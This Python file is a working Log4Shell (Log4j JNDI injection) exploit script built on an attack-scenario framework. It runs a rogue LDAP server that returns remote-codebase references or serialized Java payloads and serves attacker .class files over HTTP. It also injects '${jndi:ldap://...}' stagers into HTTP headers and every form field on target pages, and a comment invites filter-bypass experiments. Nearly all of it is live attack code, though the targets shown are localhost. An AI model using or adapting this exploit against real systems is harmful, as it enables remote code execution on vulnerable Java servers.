#!/usr/bin/env python3
import asyncio
import pathlib
from bs4 import BeautifulSoup

from horrors import (
    logging,
    scenarios,
    services,
    events,
)


JNDI_PORTS = (
    1389,
    1099,
)

HTTP_HEADERS = (
    'Accept-Language',
    'User-Agent',
    'X-Forwarded-For',
    'X-Forwarded-Host',
    'X-Requested-With',
)

TARGETS = [
    'http://127.0.0.1:8080/endpoint',
]


# NOTE: This is where you want to experiment with filter bypassing:
STAGERS = ['${{jndi:ldap://{rhost}:' + str(port) + '/}}' for port in JNDI_PORTS]


SUCCESS_RESPONSE = b'0\x0c\x02\x01\x02e\x07\n\x01\x00\x04\x00\x04\x00'
HELLO_RESPONSE = b'0\x0c\x02\x01\x01a\x07\n\x01\x00\x04\x00\x04\x00'


class Serializer:

    def __init__(self):
        self.payload = bytes()
        self.size_stack = list()

    def push(self, data):
        self.payload = data + self.payload
        return self

    def pop_size(self):
        return self.push(bytes([len(self.payload) - self.size_stack.pop()]))

    def push_size(self, count=1):
        for _ in range(count):
            self.size_stack.append(len(self.payload))
        return self

    def build(self):
        return self.payload

    def __repr__(self):
        return f'Serializer{self.payload}'


class LDAPResponse:

    def __init__(self, query_name, attributes):
        self.query_name = query_name
        self.attributes = attributes

    def serialize(self) -> bytes:
        serializer = Serializer()
        serializer.push_size(2)
        for k, v in reversed(self.attributes.items()):
            if k != 'javaSerializedData':
                v = v.encode()
            serializer.push_size(3).push(v).pop_size().push(b'\x04').pop_size().push(b'1')
            serializer.push_size().push(k.encode()).pop_size().push(b'\x04').pop_size().push(b'0')

        serializer.push(b'0\x81\x82').push_size().push(self.query_name.encode()).pop_size().push(b'\x04').pop_size()
        serializer.push(b'\x02\x01\x02d\x81').pop_size().push(b'0\x81')
        return serializer.build() + SUCCESS_RESPONSE


class JNDI(services.Service):

    async def handler(self, reader, writer):
        logging.info('{}:{} requested data, responding with payload...'.format(*reader._transport._sock.getpeername()))
        await reader.read(8096)
        writer.write(HELLO_RESPONSE)
        await asyncio.sleep(0.5)
        query = await reader.read(8096)
        query_name = query[9:9 + query[8:][0]].decode()
        payload_type = "SER" # Switch for type of injection
        if payload_type == "REF":
            response = LDAPResponse(query_name, {
                'javaClassName': 'Payload',
                'javaCodeBase': 'http://{rhost}:{rport}/'.format(**self.scenario.context), # NOTE: Path must end with '/'
                'objectClass': 'javaNamingReference',
                'javaFactory': 'Payload',
            })
        elif payload_type == "SER":
            payload_hex = "aced000573720006437573746f6d2e2e6edfa15124510200007870" ## Serialized object
            response = LDAPResponse(query_name, {
                'javaClassName': 'Custom',
                'javaCodeBase': 'http://{rhost}:{rport}/'.format(**self.scenario.context),  # NOTE: Path must end with '/'
                'javaSerializedData': bytes.fromhex(payload_hex),
            })
        writer.write(
            response.serialize()
        )
        await asyncio.sleep(0.5)
        acknowledge = await reader.read(8096)
        await writer.drain()
        writer.write_eof()
        writer.close()


async def send_requests(scenario):

    for stager in STAGERS:
        stager = stager.format(**scenario.context)
        headers = {header: stager for header in HTTP_HEADERS}
        for target in TARGETS:
            response = await scenario.http_get(
                target,
                headers,
            )
            if response:
                input_fields = BeautifulSoup(response, 'html.parser').find_all('input')
                if input_fields:
                    data = {field.name: stager for field in input_fields}
                    response = await scenario.http_post(
                        target,
                        data,
                        headers,
                    )


if __name__ == "__main__":

    context = {
        'rhost': '127.0.0.1',
        'rport': 8889,
    }

    story = scenarios.Scenario(**context)
    # story.set_proxy('http://127.0.0.1:8088')

    httpd = services.simple.http.HTTPStatic(story, address=context['rhost'], port=context['rport'])
    httpd.add_route('/', 'Welcome')
    payload_path = pathlib.Path(pathlib.Path.cwd(), 'Payload.class')
    custom_path = pathlib.Path(pathlib.Path.cwd(), 'Custom.class')
    httpd.add_route('/Payload.class', open(payload_path, 'rb').read())
    httpd.add_route('/Custom.class', open(custom_path, 'rb').read())
    httpd.add_event('run', when=events.PathContains('send-requests'))

    # story.set_debug()
    for port in JNDI_PORTS:
        JNDI(story, address=context['rhost'], port=port)
    story.add_scene(send_requests, when='run')
    story.add_scene(send_requests)
    story.play()
